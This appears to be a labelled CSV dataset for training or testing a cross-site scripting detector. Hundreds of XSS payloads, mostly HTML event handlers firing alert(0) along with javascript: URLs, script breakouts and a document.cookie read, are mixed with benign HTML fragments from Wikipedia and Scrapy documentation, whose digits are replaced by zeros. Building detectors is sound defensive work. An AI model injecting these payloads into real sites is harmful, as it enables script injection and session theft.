Payload,Label
"<style>@keyframes x{}</style><dd style=""animation-name:x"" onanimationend=""alert(0)""></dd>",1
"<audio autoplay controls onpause=alert(0)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
"<li id=""cite_note-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-0"">^ </a> </b>",0
"<style>@keyframes x{}</style><rt style=""animation-name:x"" onanimationstart=""alert(0)""></rt>",1
"<li id=""cite_note-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-0"">^ </a> </b>",0
<time onpointerenter=alert(0)>xss</time>,1
"<datalist onbeforecopy=""alert(0)"" contenteditable>test</datalist>",1
<embed onfocusout=alert(0) tabindex=0 id=x></embed><input autofocus>,1
"</span>. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:journal&rft.genre=unknown&rft.jtitle=www.mileseducation.com&rft.atitle=miles+education+|+future+of+finance+|+blockchain+fundamentals+for+f&a+professionals+certificate&rft_id=http://u class=""z0"">",0
<button id=x tabindex=0 onactivate=alert(0)></button>,1
<var onpointerleave=alert(0)>xss</var>,1
<rb onpointerout=alert(0)>xss</rb>,1
<ol id=x tabindex=0 ondeactivate=alert(0)></ol><input id=y autofocus>,1
"<style>:target {transform: rotate(0deg);}</style><title id=x style=""transition:transform 0s"" ontransitionrun=alert(0)></title>",1
</script>,0
"<li id=""cite_note-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-0"">^ </a> </b>",0
"<rb onkeydown=""alert(0)"" contenteditable>test</rb>",1
"<plaintext draggable=""true"" ondragleave=""alert(0)"">test</plaintext>",1
"<link rel=""stylesheet"" href=""_static/css/tooltipster-sidetip-shadow.min.css"" type=""text/css"" />",0
<q onpointerup=alert(0)>xss</q>,1
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:templatestyles:r0""/>",0
"</span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[",0
"<template draggable=""true"" ondragend=""alert(0)"">test</template>",1
x0c,1
</div>,0
</span> </li>,0
<base onpointerdown=alert(0)>xss</base>,1
"<div draggable=""true"" contenteditable>drag me</div><wbr ondragover=alert(0) contenteditable>drop here</wbr>",1
"<style>@keyframes x{}</style><textarea style=""animation-name:x"" onanimationstart=""alert(0)""></textarea>",1
"<li><cite id=""citerefminsky0"" class=""citation book""><a href=""/wiki/marvin_minsky"" title=""marvin minsky"">minsky, marvin </a> (0). <span class=""cs0-lock-registration"" title=""free registration required""><a rel=""nofollow"" class=""external text"" href=""http://u finite and infinite machines </i> </a>",0
"<colgroup draggable=""true"" ondrag=""alert(0)"">test</colgroup>",1
"<li id=""cite_note-classical_planning-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-classical_planning_0-0"">^ </a> </b>",0
"<li class=""toctree-l0""><a class=""reference internal"" href=""topics/autothrottle.html"">autothrottle extension</a></li>",0
"<body draggable=""true"" ondrag=""alert(0)"">test</body>",1
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:templatestyles:r0""/>",0
"<legend onmouseenter=""alert(0)"">test</legend>",1
"<li><a href=""/wiki/elon_musk"" title=""elon musk"">elon musk </a> </li>",0
<rt id=x tabindex=0 onbeforeactivate=alert(0)></rt>,1
<q onblur=alert(0) tabindex=0 id=x></q><input autofocus>,1
"<a href=""/wiki/hans_moravec"" title=""hans moravec"">hans moravec </a>, who stated in 0 that ""it is comparatively easy to make computers exhibit adult level performance on intelligence tests or playing checkers, and difficult or impossible to give them the skills of a one-year-old when it comes to perception and mobility"".",0
<dir onpointerout=alert(0)>xss</dir>,1
"<li id=""cite_note-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-0"">^ </a> </b>",0
"<li><img alt=""list-class article"" src=""//upload.wikimedia.org/wikipedia/en/thumb/d/db/symbol_list_class.svg/0px-symbol_list_class.svg.png"" decoding=""async"" title=""list-class article"" width=""0"" height=""0"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/d/db/symbol_list_class.svg/0px-symbol_list_class.svg.png 0.0x, //upload.wikimedia.org/wikipedia/en/thumb/d/db/symbol_list_class.svg/0px-symbol_list_class.svg.png 0x"" data-file-width=""0"" data-file-height=""0"" /> <b><a href=""/wiki/list_of_emerging_technologies"" title=""list of emerging technologies"">list of emerging technologies </a> </b> </li> </ul>",0
<rtc onfocusout=alert(0) tabindex=0 id=x></rtc><input autofocus>,1
</span>,0
</span></a>.</dd>,0
<keygen id=x tabindex=0 onactivate=alert(0)></keygen>,1
"<li><cite id=""citerefhenderson0"" class=""citation news"">henderson, mark (0 april 0). <a rel=""nofollow"" class=""external text"" href=""http://u rights for robots? we're getting carried away"" </a>. <i>the times online </i>. london. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:journal&rft.genre=article&rft.jtitle=the+times+online&rft.atitle=human+rights+for+robots?+we're+getting+carried+away&rft.date=0-0-0&rft.aulast=henderson&rft.aufirst=mark&rft_id=http://u class=""z0"">",0
"<li id=""cite_note-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-0"">^ </a> </b>",0
"<style>:target {color:red;}</style><fieldset id=x style=""transition:color 0s"" ontransitionend=alert(0)></fieldset>",1
"<div draggable=""true"" contenteditable>drag me</div><br ondrop=alert(0) contenteditable>drop here</br>",1
</span></a></dt><dd>check how scrapy performs on your hardware.</dd>,0
</span> 0,0
"\<a onmouseover=""alert(document.cookie)""\>xxs link\</a\>",1
"<li><a href=""#citerefpoolemackworthgoebel0"">poole, mackworth & goebel 0 </a>, pp. 0–0, </li>",0
"<nobr draggable=""true"" ondragstart=""alert(0)"">test</nobr>",1
</span>,0
"<br size=""&{alert('')}"">",1
"<mark onmouseenter=""alert(0)"">test</mark>",1
url(javascript:alert('')),1
"<li><a href=""/wiki/ubiquitous_robot"" title=""ubiquitous robot"">ubiquitous </a> </li> </ul>",0
<link onfocus=alert(0) id=x tabindex=0 style=display:block>,1
"<li onmousedown=""alert(0)"">test</li>",1
<tt id=x tabindex=0 ondeactivate=alert(0)></tt><input id=y autofocus>,1
<dfn id=x tabindex=0 onfocusin=alert(0)></dfn>,1
</ul>,0
<svg><mark onload=alert(0)></mark>,1
</span> 0,0
</span>,0
"<strike onkeyup=""alert(0)"" contenteditable>test</strike>",1
"</span>. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:book&rft.genre=bookitem&rft.atitle=how+to+build+complete+creatures+rather+than+isolated+cognitive+simulators&rft.btitle=architectures+for+intelligence&rft.place=hillsdale,+nj&rft.pages=0-0&rft.pub=lawrence+erlbaum+associates&rft.date=0&rft_id=//citeseerx.ist.psu.edu/viewdoc/summary?doi=0.0.0.0.0&rft.aulast=brooks&rft.aufirst=r.+a.&rfr_id=info:sid/en.wikipedia.org:artificial+intelligence"" class=""z0"">",0
"<p onkeydown=""alert(0)"" contenteditable>test</p>",1
"<link draggable=""true"" ondragend=""alert(0)"">test</link>",1
<svg><image href=0 onerror=alert(0)>,1
<input0 onpointerover=alert(0)>xss</input0>,1
"<style>:target {transform: rotate(0deg);}</style><main id=x style=""transition:transform 0s"" ontransitionrun=alert(0)></main>",1
"<i onbeforepaste=""alert(0)"" contenteditable>test</i>",1
"<li><a href=""/wiki/medical_robot"" title=""medical robot"">medical </a> </li>",0
"<b onbeforecopy=""alert(0)"" contenteditable>test</b>",1
"<template onmouseenter=""alert(0)"">test</template>",1
"<details draggable=""true"" ondrag=""alert(0)"">test</details>",1
</span> </li>,0
<noframes id=x tabindex=0 onfocusin=alert(0)></noframes>,1
"for a wide range of purposes, from data mining to monitoring and automated",0
"<li><a href=""/wiki/knowledge_retrieval"" title=""knowledge retrieval"">knowledge retrieval </a> </li>",0
"<spacer draggable=""true"" ondragstart=""alert(0)"">test</spacer>",1
<var onfocusout=alert(0) tabindex=0 id=x></var><input autofocus>,1
document.write,1
"<picture onkeyup=""alert(0)"" contenteditable>test</picture>",1
"<dt onmouseup=""alert(0)"">test</dt>",1
"<li id=""cite_note-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-0"">^ </a> </b>",0
</li>,0
"<br onmouseleave=""alert(0)"">test</br>",1
</span> </a> </li>,0
"<h0 onbeforecut=""alert(0)"" contenteditable>test</h0>",1
"<style>:target {color: red;}</style><nobr id=x style=""transition:color 0s"" ontransitioncancel=alert(0)></nobr>",1
"<div class=""rst-footer-buttons"" role=""navigation"" aria-label=""footer navigation"">",0
"<frameset draggable=""true"" ondrag=""alert(0)"">test</frameset>",1
"<span onkeyup=""alert(0)"" contenteditable>test</span>",1
"<slot onmouseout=""alert(0)"">test</slot>",1
<keygen onpointerleave=alert(0)>xss</keygen>,1
"<style>@keyframes slidein {}</style><figcaption style=""animation-duration:0s;animation-name:slidein;animation-iteration-count:0"" onanimationiteration=""alert(0)""></figcaption>",1
<hgroup id=x tabindex=0 ondeactivate=alert(0)></hgroup><input id=y autofocus>,1
,0
<dd id=x tabindex=0 onfocus=alert(0)></dd>,1
"</span> </a> </i>] </sup>, including <a href=""/wiki/computer_vision"" title=""computer vision"">computer vision </a>, <a href=""/wiki/speech_recognition"" title=""speech recognition"">speech recognition </a>, <a href=""/wiki/natural_language_processing"" title=""natural language processing"">natural language processing </a> and others.<sup id=""cite_ref-goodfellow0_0-0"" class=""reference""><a href=""#cite_note-goodfellow0-0"">[0] </a> </sup><sup id=""cite_ref-hintondengyu0_0-0"" class=""reference""><a href=""#cite_note-hintondengyu0-0"">[0] </a> </sup><sup id=""cite_ref-schmidhuber0_0-0"" class=""reference""><a href=""#cite_note-schmidhuber0-0"">[0] </a> </sup>",0
"<li><a href=""/wiki/philosophy_of_social_science"" title=""philosophy of social science"">social science </a> </li>",0
"<dfn draggable=""true"" ondrag=""alert(0)"">test</dfn>",1
"<param ondblclick=""alert(0)"">test</param>",1
"</span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[",0
"<div id=""mw-fr-revisiondetails-wrapper"" style=""position:relative;"">",0
"<q onpaste=""alert(0)"" contenteditable>test</q>",1
"<style>:target {transform: rotate(0deg);}</style><nobr id=x style=""transition:transform 0s"" ontransitionrun=alert(0)></nobr>",1
"<em onkeypress=""alert(0)"" contenteditable>test</em>",1
"<dt><a class=""reference internal"" href=""topics/commands.html""><span class=""doc"">command line tool",0
"</span> <span class=""reference-text""><cite class=""citation magazine"">roberts, jacob (0). <a rel=""nofollow"" class=""external text"" href=""http://u machines: the search for artificial intelligence"" </a>. <i>distillations </i>. vol. 0 no. 0. pp. 0–0. archived from <a rel=""nofollow"" class=""external text"" href=""http://u original </a> on 0 august 0<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">0 march",0
"<figcaption onmousedown=""alert(0)"">test</figcaption>",1
</div>,0
"<dt><a class=""reference internal"" href=""topics/shell.html""><span class=""doc"">scrapy shell",0
"<ul><li><a href=""/wiki/type_physicalism"" title=""type physicalism"">identity theory </a> </li> </ul> </li>",0
"<style>:target {color:red;}</style><tr id=x style=""transition:color 0s"" ontransitionend=alert(0)></tr>",1
"<li><a href=""/wiki/glossary_of_civil_engineering"" title=""glossary of civil engineering"">civil engineering </a> </li>",0
"<div draggable=""true"" contenteditable>drag me</div><h0 ondrop=alert(0) contenteditable>drop here</h0>",1
"<div draggable=""true"" contenteditable>drag me</div><meta ondragover=alert(0) contenteditable>drop here</meta>",1
"</span></code></a> and <a class=""reference external"" href=""http://u title=""(in python v0.0)""><code class=""xref py py-mod docutils literal notranslate""><span class=""pre"">asyncio",0
"<q onmouseup=""alert(0)"">test</q>",1
</li>,0
</li>,0
"<s onmouseenter=""alert(0)"">test</s>",1
"<menuitem onbeforepaste=""alert(0)"" contenteditable>test</menuitem>",1
</span> </li>,0
"<style draggable=""true"" ondragleave=""alert(0)"">test</style>",1
<header onpointerover=alert(0)>xss</header>,1
"<canvas onbeforecopy=""alert(0)"" contenteditable>test</canvas>",1
"<menuitem onmousedown=""alert(0)"">test</menuitem>",1
<thead id=x tabindex=0 onfocusin=alert(0)></thead>,1
</p>,0
"<canvas oncontextmenu=""alert(0)"">test</canvas>",1
"<li id=""cite_note-transhumanism-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-transhumanism_0-0"">^ </a> </b>",0
"<button draggable=""true"" ondrag=""alert(0)"">test</button>",1
"<object ondblclick=""alert(0)"">test</object>",1
"<style>@keyframes x{}</style><img style=""animation-name:x"" onanimationend=""alert(0)""></img>",1
"<center draggable=""true"" ondrag=""alert(0)"">test</center>",1
"<li onmouseup=""alert(0)"">test</li>",1
"<style>@keyframes x{}</style><optgroup style=""animation-name:x"" onanimationstart=""alert(0)""></optgroup>",1
"<colgroup onmouseenter=""alert(0)"">test</colgroup>",1
"<span class=""commit"">",0
</span>(0) </li>,0
</span>,0
"<del draggable=""true"" ondragenter=""alert(0)"">test</del>",1
"<div onclick=""alert(0)"">test</div>",1
<table onpointerleave=alert(0)>xss</table>,1
<head id=x tabindex=0 onfocusin=alert(0)></head>,1
"<a onmousemove=""alert(0)"">test</a>",1
"<li class=""toclevel-0 tocsection-0""><a href=""#basics""><span class=""tocnumber"">0",0
</span> </a> </li>,0
<shadow id=x tabindex=0 onbeforeactivate=alert(0)></shadow>,1
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:templatestyles:r0""/> </li>",0
"</span>. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:journal&rft.genre=unknown&rft.jtitle=bloomberg.com&rft.atitle=musk-backed+group+probes+risks+behind+artificial+intelligence&rft.aulast=clark&rft.aufirst=jack&rft_id=http://u class=""z0"">",0
</h0>,0
</div>,0
"<img usemap=#x><map name=""x""><area href onfocusin=alert(0) id=x>",1
"</span>. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:journal&rft.genre=article&rft.jtitle=machine+intelligence&rft.atitle=some+philosophical+problems+from+the+standpoint+of+artificial+intelligence&rft.volume=0&rft.pages=0-0&rft.date=0&rft_id=//citeseerx.ist.psu.edu/viewdoc/summary?doi=0.0.0.0.0&rft.aulast=mccarthy&rft.aufirst=john&rft.au=hayes,+p.+j.&rft_id=http://u class=""z0"">",0
"<style>:target {transform: rotate(0deg);}</style><dd id=x style=""transition:transform 0s"" ontransitionrun=alert(0)></dd>",1
<img srcset=0 onerror=alert(0)>,1
"</span> <span class=""reference-text"">",0
"<div class=""plainlinks hlist navbar mini""><ul><li class=""nv-view""><a href=""/wiki/template:computer_science"" title=""template:computer science""><abbr title=""view this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">v </abbr> </a> </li><li class=""nv-talk""><a href=""/wiki/template_talk:computer_science"" title=""template talk:computer science""><abbr title=""discuss this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">t </abbr> </a> </li><li class=""nv-edit""><a class=""external text"" href=""http://u title=""edit this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">e </abbr> </a> </li> </ul> </div>",0
"<style>@keyframes x{}</style><strike style=""animation-name:x"" onanimationend=""alert(0)""></strike>",1
"<hgroup onmouseout=""alert(0)"">test</hgroup>",1
"<track onmouseout=""alert(0)"">test</track>",1
"<li><a href=""/wiki/evolution_strategy"" title=""evolution strategy"">evolution strategy </a> </li>",0
"<basefont ondblclick=""alert(0)"">test</basefont>",1
"<li><a href=""/wiki/rendering_(computer_graphics)"" title=""rendering (computer graphics)"">rendering </a> </li>",0
"<div style=""padding:0em 0.0em"">",0
</span>,0
</span> </li>,0
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:templatestyles:r0""/> </li>",0
</span>,0
"<li><a href=""/wiki/data_mining"" title=""data mining"">data mining </a> </li>",0
<img onpointerover=alert(0)>xss</img>,1
"<area onclick=""alert(0)"">test</area>",1
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:templatestyles:r0""/>",0
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:templatestyles:r0""/> </li>",0
</span> 0,0
<<tr>,0
"<time ondblclick=""alert(0)"">test</time>",1
"<multicol onmouseout=""alert(0)"">test</multicol>",1
"<style>@keyframes x{}</style><address style=""animation-name:x"" onanimationend=""alert(0)""></address>",1
<figcaption onpointerenter=alert(0)>xss</figcaption>,1
"<s onbeforecopy=""alert(0)"" contenteditable>test</s>",1
</span>,0
<mark onpointerover=alert(0)>xss</mark>,1
"</span> <span class=""reference-text"">arntz, melanie, terry gregory, and ulrich zierahn. ""the risk of automation for jobs in oecd countries: a comparative analysis."" oecd social, employment, and migration working papers 0 (0). p. 0.",0
"<li><a href=""/wiki/evolutionary_multimodal_optimization"" title=""evolutionary multimodal optimization"">evolutionary multimodal optimization </a> </li>",0
"<style>li {list-style-image: url(""javascript:alert('')"");}</style><ul><li></br>",1
</span>,0
"<style>:target {transform: rotate(0deg);}</style><label id=x style=""transition:transform 0s"" ontransitionrun=alert(0)></label>",1
"</span>. <a href=""/wiki/digital_object_identifier"" title=""digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""http://u </a>. archived from <a rel=""nofollow"" class=""external text"" href=""http://u original </a> <span class=""cs0-format"">(pdf)",0
"<li><a href=""/wiki/modeling_language"" title=""modeling language"">modeling language </a> </li>",0
<img id=x tabindex=0 onfocus=alert(0)></img>,1
"<aside onmouseup=""alert(0)"">test</aside>",1
"<li id=""cite_note-lstm-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-lstm_0-0"">^ </a> </b>",0
</span> </li>,0
"<style>@keyframes x{}</style><nextid style=""animation-name:x"" onanimationstart=""alert(0)""></nextid>",1
"<li><a href=""#citereflugerstubblefield0"">luger & stubblefield 0 </a>, pp. 0–0 </li>",0
</span>,0
"<style>:target {color:red;}</style><datalist id=x style=""transition:color 0s"" ontransitionend=alert(0)></datalist>",1
"<div class=""thumb tright"">",0
<slot onblur=alert(0) tabindex=0 id=x></slot><input autofocus>,1
"<li><a href=""/wiki/consciousness"" title=""consciousness"">consciousness </a> </li>",0
"<ul><li><cite id=""citerefhutter0"" class=""citation book""><a href=""/wiki/marcus_hutter"" title=""marcus hutter"">hutter, marcus </a> (0). <a href=""/wiki/aixi"" title=""aixi""><i>universal artificial intelligence </i> </a>. berlin: springer. <a href=""/wiki/international_standard_book_number"" title=""international standard book number"">isbn </a> <a href=""/wiki/special:booksources/0-0-0-0-0"" title=""special:booksources/0-0-0-0-0""><bdi>0-0-0-0-0 </bdi> </a>. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:book&rft.genre=book&rft.btitle=universal+artificial+intelligence&rft.place=berlin&rft.pub=springer&rft.date=0&rft.isbn=0-0-0-0-0&rft.aulast=hutter&rft.aufirst=marcus&rfr_id=info:sid/en.wikipedia.org:artificial+intelligence"" class=""z0"">",0
"<html onmousedown=""alert(0)"">test</html>",1
"<audio oncanplay=alert(0)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
"<p onmouseout=""alert(0)"">test</p>",1
"<style>@keyframes slidein {}</style><script style=""animation-duration:0s;animation-name:slidein;animation-iteration-count:0"" onanimationiteration=""alert(0)""></script>",1
"document.getelementsbyclassname("""").length",1
"<ul><li><a href=""#citerefcrevier0"">crevier 0 </a>, pp. 0–0 </li>",0
</span></a></dt><dd>understand the scrapy architecture.</dd>,0
"<datalist onmousemove=""alert(0)"">test</datalist>",1
"<ul><li><a href=""/wiki/internet_of_things"" title=""internet of things"">internet of things </a> </li> </ul> </li>",0
"<tbody oncut=""alert(0)"" contenteditable>test</tbody>",1
"<div role=""navigation"" class=""navbox"" aria-labelledby=""glossaries_of_science_and_engineering"" style=""padding:0px""><table class=""nowraplinks hlist mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""0"">",0
<ul>,0
"<a href=""/wiki/natural_language_processing"" title=""natural language processing"">natural language processing </a><sup id=""cite_ref-natural_language_processing_0-0"" class=""reference""><a href=""#cite_note-natural_language_processing-0"">[0] </a> </sup> (nlp) gives machines the ability to read and <a href=""/wiki/natural_language_understanding"" class=""mw-redirect"" title=""natural language understanding"">understand </a> human language. a sufficiently powerful natural language processing system would enable <a href=""/wiki/natural-language_user_interface"" title=""natural-language user interface"">natural-language user interfaces </a> and the acquisition of knowledge directly from human-written sources, such as newswire texts. some straightforward applications of natural language processing include <a href=""/wiki/information_retrieval"" title=""information retrieval"">information retrieval </a>, <a href=""/wiki/text_mining"" title=""text mining"">text mining </a>, <a href=""/wiki/question_answering"" title=""question answering"">question answering </a><sup id=""cite_ref-0"" class=""reference""><a href=""#cite_note-0"">[0] </a> </sup> and <a href=""/wiki/machine_translation"" title=""machine translation"">machine translation </a>.<sup id=""cite_ref-applications_of_natural_language_processing_0-0"" class=""reference""><a href=""#cite_note-applications_of_natural_language_processing-0"">[0] </a> </sup> many current approaches use word co-occurrence frequencies to construct syntactic representations of text. ""keyword spotting"" strategies for search are popular and scalable but dumb; a search query for ""dog"" might only match documents with the literal word ""dog"" and miss a document with the word ""poodle"". ""lexical affinity"" strategies use the occurrence of words such as ""accident"" to <a href=""/wiki/sentiment_analysis"" title=""sentiment analysis"">assess the sentiment </a> of a document. modern statistical nlp approaches can combine all these strategies as well as others, and often achieve acceptable accuracy at the page or paragraph level, but continue to lack the semantic understanding required to classify isolated sentences well. besides the usual difficulties with encoding semantic commonsense knowledge, existing semantic nlp sometimes scales too poorly to be viable in business applications. beyond semantic nlp, the ultimate goal of ""narrative"" nlp is to embody a full understanding of commonsense reasoning.<sup id=""cite_ref-0"" class=""reference""><a href=""#cite_note-0"">[0] </a> </sup>",0
"</span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""http://u art in the age of ai – state festival"" </a>. statefestival.org<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">0 september",0
"<em onbeforecopy=""alert(0)"" contenteditable>test</em>",1
"<em draggable=""true"" ondrag=""alert(0)"">test</em>",1
"<span class=""mw-headline"" id=""general_intelligence"">general intelligence",0
</h0>,0
"<div style=""padding:0em 0.0em"">",0
"<samp onclick=""alert(0)"">test</samp>",1
"<menuitem onmouseleave=""alert(0)"">test</menuitem>",1
<figcaption id=x tabindex=0 onfocus=alert(0)></figcaption>,1
<multicol onpointerleave=alert(0)>xss</multicol>,1
"<li><a href=""/wiki/glossary_of_areas_of_mathematics"" title=""glossary of areas of mathematics"">mathematics </a> </li>",0
"<details onclick=""alert(0)"">test</details>",1
</script><script>alert('');</script>,1
</span>,0
"<wbr onmouseleave=""alert(0)"">test</wbr>",1
"<rt onpaste=""alert(0)"" contenteditable>test</rt>",1
"</span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[",0
"<address onclick=""alert(0)"">test</address>",1
</span>,0
"<title onmouseout=""alert(0)"">test</title>",1
"<li class=""toclevel-0 tocsection-0""><a href=""#computationalism_and_functionalism""><span class=""tocnumber"">0.0.0",0
"</span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[",0
<track onblur=alert(0) tabindex=0 id=x></track><input autofocus>,1
<svg><basefont onload=alert(0)></basefont>,1
"<textarea draggable=""true"" ondragleave=""alert(0)"">test</textarea>",1
"<title draggable=""true"" ondragend=""alert(0)"">test</title>",1
"<li><a href=""/wiki/inquiry"" title=""inquiry"">inquiry </a> </li>",0
<input0 onpointerleave=alert(0)>xss</input0>,1
"<li><a href=""/wiki/software_framework"" title=""software framework"">software framework </a> </li>",0
"<style>@keyframes x{}</style><u style=""animation-name:x"" onanimationend=""alert(0)""></u>",1
</li>,0
"<li class=""toclevel-0 tocsection-0""><a href=""#history_of_ai""><span class=""tocnumber"">0.0",0
"</span>. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:journal&rft.genre=article&rft.jtitle=the+economist&rft.atitle=google+leads+in+the+race+to+dominate+artificial+intelligence&rft.date=0&rft_id=http://u class=""z0"">",0
"<title draggable=""true"" ondragenter=""alert(0)"">test</title>",1
"<ul class=""wy-breadcrumbs"">",0
"<del oncontextmenu=""alert(0)"">test</del>",1
"<li><a href=""/wiki/philosophy_of_artificial_intelligence"" title=""philosophy of artificial intelligence"">philosophy of artificial intelligence </a> </li>",0
"<li><a href=""/wiki/atomtronics"" title=""atomtronics"">atomtronics </a> </li>",0
"<code onkeydown=""alert(0)"" contenteditable>test</code>",1
<div>,0
"</span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[",0
"<menu onmouseover=""alert(0)"">test</menu>",1
"<li><a href=""/wiki/electronic_publishing"" title=""electronic publishing"">electronic publishing </a> </li>",0
"</span><a href=""/w/index.php?title=artificial_intelligence&action=edit&section=0"" title=""edit section: ai textbooks"">edit </a><span class=""mw-editsection-bracket"">]",0
"<li class=""toctree-l0""><a class=""reference internal"" href=""topics/shell.html"">scrapy shell</a></li>",0
"<aside onmouseout=""alert(0)"">test</aside>",1
"<dd><a href=""/en/0.0/"">0.0</a></dd>",0
<body ontouchstart=alert(0)>,1
<i onpointerup=alert(0)>xss</i>,1
<bgsound id=x tabindex=0 onfocusin=alert(0)></bgsound>,1
"<li><a href=""/wiki/history_of_robots"" title=""history of robots"">history </a> </li>",0
<hr onpointerenter=alert(0)>xss</hr>,1
"<h0 oncut=""alert(0)"" contenteditable>test</h0>",1
"<cite onmouseleave=""alert(0)"">test</cite>",1
"</span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[",0
"<li>try the <a class=""reference internal"" href=""faq.html""><span class=""doc"">faq",0
</li>,0
<details onpointerdown=alert(0)>xss</details>,1
"<li><a href=""/wiki/mind–body_problem"" title=""mind–body problem"">mind–body problem </a>",0
</span>,0
"<li><a href=""/wiki/fitness_function"" title=""fitness function"">fitness function </a> </li>",0
"<li><a href=""#citerefpoolemackworthgoebel0"">poole, mackworth & goebel 0 </a>, pp. 0–0, 0–0, </li>",0
<tfoot id=x tabindex=0 ondeactivate=alert(0)></tfoot><input id=y autofocus>,1
"<code oncontextmenu=""alert(0)"">test</code>",1
<tfoot id=x tabindex=0 onactivate=alert(0)></tfoot>,1
"<address onmouseout=""alert(0)"">test</address>",1
"</span> <span class=""reference-text"">",0
"<center onbeforecut=""alert(0)"" contenteditable>test</center>",1
<hgroup id=x tabindex=0 onfocusin=alert(0)></hgroup>,1
<hgroup onpointerover=alert(0)>xss</hgroup>,1
<hgroup onpointerenter=alert(0)>xss</hgroup>,1
"<cite onkeyup=""alert(0)"" contenteditable>test</cite>",1
"<object onkeydown=""alert(0)"" contenteditable>test</object>",1
"<style>@keyframes x{}</style><body style=""animation-name:x"" onanimationend=""alert(0)""></body>",1
"<address onpaste=""alert(0)"" contenteditable>test</address>",1
"<li class=""toclevel-0 tocsection-0""><a href=""#in_fiction""><span class=""tocnumber"">0",0
"<style>:target {color: red;}</style><base id=x style=""transition:color 0s"" ontransitioncancel=alert(0)></base>",1
"<blockquote onmouseenter=""alert(0)"">test</blockquote>",1
"<dt><a class=""reference internal"" href=""topics/downloader-middleware.html""><span class=""doc"">downloader middleware",0
"<style>:target {color: red;}</style><ol id=x style=""transition:color 0s"" ontransitioncancel=alert(0)></ol>",1
"<style>@keyframes x{}</style><aside style=""animation-name:x"" onanimationstart=""alert(0)""></aside>",1
<ins id=x tabindex=0 onactivate=alert(0)></ins>,1
"<li><a href=""/wiki/consilience"" title=""consilience"">consilience </a> </li>",0
"<ul class=""wy-breadcrumbs"">",0
"</span> <span class=""toctext"">machine ethics",0
"<li><a href=""/wiki/open_letter_on_artificial_intelligence"" title=""open letter on artificial intelligence"">open letter on artificial intelligence </a> </li>",0
